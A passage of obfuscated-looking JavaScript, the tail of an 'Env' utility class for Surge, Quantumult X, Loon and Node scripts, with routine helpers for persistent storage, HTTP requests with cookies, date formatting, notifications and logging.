        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const _0x2d79b8 = this.path.resolve(this.dataFile),
          _0x330da7 = this.path.resolve(process.cwd(), this.dataFile),
          _0x4fd683 = this.fs.existsSync(_0x2d79b8),
          _0x2bcbf9 = !_0x4fd683 && this.fs.existsSync(_0x330da7),
          _0x5e5539 = JSON.stringify(this.data);
        _0x4fd683 ? this.fs.writeFileSync(_0x2d79b8, _0x5e5539) : _0x2bcbf9 ? this.fs.writeFileSync(_0x330da7, _0x5e5539) : this.fs.writeFileSync(_0x2d79b8, _0x5e5539);
      }
    }
    lodash_get(_0x285a46, _0x1c9886, _0x4a3af8) {
      const _0x420940 = _0x1c9886.replace(/\[(\d+)\]/g, ".$1").split(".");
      let _0x2b3406 = _0x285a46;
      for (const _0x39d63c of _0x420940) if (_0x2b3406 = Object(_0x2b3406)[_0x39d63c], void 0 === _0x2b3406) {
        return _0x4a3af8;
      }
      return _0x2b3406;
    }
    lodash_set(_0x1475f6, _0x202a9a, _0x532057) {
      return Object(_0x1475f6) !== _0x1475f6 ? _0x1475f6 : (Array.isArray(_0x202a9a) || (_0x202a9a = _0x202a9a.toString().match(/[^.[\]]+/g) || []), _0x202a9a.slice(0, -1).reduce((_0x5a7ad5, _0x2787b1, _0x86d33a) => Object(_0x5a7ad5[_0x2787b1]) === _0x5a7ad5[_0x2787b1] ? _0x5a7ad5[_0x2787b1] : _0x5a7ad5[_0x2787b1] = Math.abs(_0x202a9a[_0x86d33a + 1]) >> 0 == +_0x202a9a[_0x86d33a + 1] ? [] : {}, _0x1475f6)[_0x202a9a[_0x202a9a.length - 1]] = _0x532057, _0x1475f6);
    }
    getdata(_0x363437) {
      let _0x2bd69f = this.getval(_0x363437);
      if (/^@/.test(_0x363437)) {
        const [, _0x4c6b3f, _0x789298] = /^@(.*?)\.(.*?)$/.exec(_0x363437),
          _0x523bba = _0x4c6b3f ? this.getval(_0x4c6b3f) : "";
        if (_0x523bba) {
          try {
            const _0x15dc87 = JSON.parse(_0x523bba);
            _0x2bd69f = _0x15dc87 ? this.lodash_get(_0x15dc87, _0x789298, "") : _0x2bd69f;
          } catch (_0x3b4670) {
            _0x2bd69f = "";
          }
        }
      }
      return _0x2bd69f;
    }
    setdata(_0x5d93b7, _0x1ec3c7) {
      let _0x9b910d = !1;
      if (/^@/.test(_0x1ec3c7)) {
        const [, _0x2f4305, _0x2cb747] = /^@(.*?)\.(.*?)$/.exec(_0x1ec3c7),
          _0x10b692 = this.getval(_0x2f4305),
          _0x191e59 = _0x2f4305 ? "null" === _0x10b692 ? null : _0x10b692 || "{}" : "{}";
        try {
          const _0x1c565f = JSON.parse(_0x191e59);
          this.lodash_set(_0x1c565f, _0x2cb747, _0x5d93b7);
          _0x9b910d = this.setval(JSON.stringify(_0x1c565f), _0x2f4305);
        } catch (_0x1b04b0) {
          const _0x24f598 = {};
          this.lodash_set(_0x24f598, _0x2cb747, _0x5d93b7);
          _0x9b910d = this.setval(JSON.stringify(_0x24f598), _0x2f4305);
        }
      } else {
        _0x9b910d = this.setval(_0x5d93b7, _0x1ec3c7);
      }
      return _0x9b910d;
    }
    getval(_0x405563) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(_0x405563) : this.isQuanX() ? $prefs.valueForKey(_0x405563) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x405563]) : this.data && this.data[_0x405563] || null;
    }
    setval(_0x2d252f, _0x4dde61) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(_0x2d252f, _0x4dde61) : this.isQuanX() ? $prefs.setValueForKey(_0x2d252f, _0x4dde61) : this.isNode() ? (this.data = this.loaddata(), this.data[_0x4dde61] = _0x2d252f, this.writedata(), !0) : this.data && this.data[_0x4dde61] || null;
    }
    initGotEnv(_0x52e30e) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      _0x52e30e && (_0x52e30e.headers = _0x52e30e.headers ? _0x52e30e.headers : {}, void 0 === _0x52e30e.headers.Cookie && void 0 === _0x52e30e.cookieJar && (_0x52e30e.cookieJar = this.ckjar));
    }
    get(_0x5dc887, _0x37641d = () => {}) {
      _0x5dc887.headers && (delete _0x5dc887.headers["Content-Type"], delete _0x5dc887.headers["Content-Length"]);
      this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (_0x5dc887.headers = _0x5dc887.headers || {}, Object.assign(_0x5dc887.headers, {
        "X-Surge-Skip-Scripting": !1
      })), $httpClient.get(_0x5dc887, (_0x44f25a, _0x43e398, _0x3bf2ed) => {
        !_0x44f25a && _0x43e398 && (_0x43e398.body = _0x3bf2ed, _0x43e398.statusCode = _0x43e398.status);
        _0x37641d(_0x44f25a, _0x43e398, _0x3bf2ed);
      })) : this.isQuanX() ? (this.isNeedRewrite && (_0x5dc887.opts = _0x5dc887.opts || {}, Object.assign(_0x5dc887.opts, {
        hints: !1
      })), $task.fetch(_0x5dc887).then(_0x1acffc => {
        const {
          statusCode: _0x2182bb,
          statusCode: _0x1af527,
          headers: _0x3dc973,
          body: _0xb1f947
        } = _0x1acffc;
        _0x37641d(null, {
          status: _0x2182bb,
          statusCode: _0x1af527,
          headers: _0x3dc973,
          body: _0xb1f947
        }, _0xb1f947);
      }, _0x41b85f => _0x37641d(_0x41b85f))) : this.isNode() && (this.initGotEnv(_0x5dc887), this.got(_0x5dc887).on("redirect", (_0x1b0c0c, _0x3e992a) => {
        try {
          if (_0x1b0c0c.headers["set-cookie"]) {
            const _0x268f05 = _0x1b0c0c.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            _0x268f05 && this.ckjar.setCookieSync(_0x268f05, null);
            _0x3e992a.cookieJar = this.ckjar;
          }
        } catch (_0x7efaf0) {
          this.logErr(_0x7efaf0);
        }
      }).then(_0x132c07 => {
        const {
          statusCode: _0xf91e8,
          statusCode: _0x53cc18,
          headers: _0x5b96b9,
          body: _0x21d437
        } = _0x132c07;
        _0x37641d(null, {
          status: _0xf91e8,
          statusCode: _0x53cc18,
          headers: _0x5b96b9,
          body: _0x21d437
        }, _0x21d437);
      }, _0x1ff260 => {
        const {
          message: _0x245525,
          response: _0x12ec41
        } = _0x1ff260;
        _0x37641d(_0x245525, _0x12ec41, _0x12ec41 && _0x12ec41.body);
      }));
    }
    post(_0x4188f5, _0x4387ba = () => {}) {
      if (_0x4188f5.body && _0x4188f5.headers && !_0x4188f5.headers["Content-Type"] && (_0x4188f5.headers["Content-Type"] = "application/x-www-form-urlencoded"), _0x4188f5.headers && delete _0x4188f5.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (_0x4188f5.headers = _0x4188f5.headers || {}, Object.assign(_0x4188f5.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.post(_0x4188f5, (_0x3bde45, _0x115e57, _0x299292) => {
          !_0x3bde45 && _0x115e57 && (_0x115e57.body = _0x299292, _0x115e57.statusCode = _0x115e57.status);
          _0x4387ba(_0x3bde45, _0x115e57, _0x299292);
        });
      } else {
        if (this.isQuanX()) {
          _0x4188f5.method = "POST";
          this.isNeedRewrite && (_0x4188f5.opts = _0x4188f5.opts || {}, Object.assign(_0x4188f5.opts, {
            hints: !1
          }));
          $task.fetch(_0x4188f5).then(_0x3efb80 => {
            const {
              statusCode: _0x4e0b6e,
              statusCode: _0x4fe329,
              headers: _0xc07e98,
              body: _0x1fbe88
            } = _0x3efb80;
            _0x4387ba(null, {
              status: _0x4e0b6e,
              statusCode: _0x4fe329,
              headers: _0xc07e98,
              body: _0x1fbe88
            }, _0x1fbe88);
          }, _0x33fb09 => _0x4387ba(_0x33fb09));
        } else {
          if (this.isNode()) {
            this.initGotEnv(_0x4188f5);
            const {
              url: _0x352e07,
              ..._0xf8650d
            } = _0x4188f5;
            this.got.post(_0x352e07, _0xf8650d).then(_0x542439 => {
              const {
                statusCode: _0x164627,
                statusCode: _0x1ef7f9,
                headers: _0x36913c,
                body: _0x4971af
              } = _0x542439;
              _0x4387ba(null, {
                status: _0x164627,
                statusCode: _0x1ef7f9,
                headers: _0x36913c,
                body: _0x4971af
              }, _0x4971af);
            }, _0x2ca3d0 => {
              const {
                message: _0x59efcc,
                response: _0x43c977
              } = _0x2ca3d0;
              _0x4387ba(_0x59efcc, _0x43c977, _0x43c977 && _0x43c977.body);
            });
          }
        }
      }
    }
    time(_0x2bb33e) {
      let _0x322249 = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "H+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(_0x2bb33e) && (_0x2bb33e = _0x2bb33e.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let _0xb38140 in _0x322249) new RegExp("(" + _0xb38140 + ")").test(_0x2bb33e) && (_0x2bb33e = _0x2bb33e.replace(RegExp.$1, 1 == RegExp.$1.length ? _0x322249[_0xb38140] : ("00" + _0x322249[_0xb38140]).substr(("" + _0x322249[_0xb38140]).length)));
      return _0x2bb33e;
    }
    msg(_0xd9048 = _0x480ab2, _0x357601 = "", _0x29f949 = "", _0x5000e7) {
      const _0x3da0ca = _0x4b85ee => {
        if (!_0x4b85ee) {
          return _0x4b85ee;
        }
        if ("string" == typeof _0x4b85ee) {
          return this.isLoon() ? _0x4b85ee : this.isQuanX() ? {
            "open-url": _0x4b85ee
          } : this.isSurge() ? {
            url: _0x4b85ee
          } : void 0;
        }
        if ("object" == typeof _0x4b85ee) {
          if (this.isLoon()) {
            let _0x53e0c6 = _0x4b85ee.openUrl || _0x4b85ee.url || _0x4b85ee["open-url"],
              _0x415050 = _0x4b85ee.mediaUrl || _0x4b85ee["media-url"];
            return {
              openUrl: _0x53e0c6,
              mediaUrl: _0x415050
            };
          }
          if (this.isQuanX()) {
            let _0x54074d = _0x4b85ee["open-url"] || _0x4b85ee.url || _0x4b85ee.openUrl,
              _0xfbd112 = _0x4b85ee["media-url"] || _0x4b85ee.mediaUrl;
            return {
              "open-url": _0x54074d,
              "media-url": _0xfbd112
            };
          }
          if (this.isSurge()) {
            let _0x54733b = _0x4b85ee.url || _0x4b85ee.openUrl || _0x4b85ee["open-url"];
            return {
              url: _0x54733b
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(_0xd9048, _0x357601, _0x29f949, _0x3da0ca(_0x5000e7)) : this.isQuanX() && $notify(_0xd9048, _0x357601, _0x29f949, _0x3da0ca(_0x5000e7))), !this.isMuteLog) {
        let _0x3d5121 = ["", "==============📣系统通知📣=============="];
        _0x3d5121.push(_0xd9048);
        _0x357601 && _0x3d5121.push(_0x357601);
        _0x29f949 && _0x3d5121.push(_0x29f949);
        console.log(_0x3d5121.join("\n"));
        this.logs = this.logs.concat(_0x3d5121);
      }
    }
    log(..._0x533a1f) {
      _0x533a1f.length > 0 && (this.logs = [...this.logs, ..._0x533a1f]);
      console.log(_0x533a1f.join(this.logSeparator));
    }
    logErr(_0x1b5966, _0x334b6d) {
      const _0x4d3e96 = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      _0x4d3e96 ? this.log("", "❗️" + this.name + ", 错误!", _0x1b5966.stack) : this.log("", "❗️" + this.name + ", 错误!", _0x1b5966);
    }
    wait(_0x133ce8) {
      return new Promise(_0x27a760 => setTimeout(_0x27a760, _0x133ce8));
    }
    done(_0x1b0d50 = {}) {
      const _0x59140d = new Date().getTime(),
        _0x2a2961 = (_0x59140d - this.startTime) / 1000;
      this.log("", "🔔" + this.name + ", 结束! 🕛 " + _0x2a2961 + " 秒");
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(_0x1b0d50);
    }
  }(_0x480ab2, _0x4424f4);
}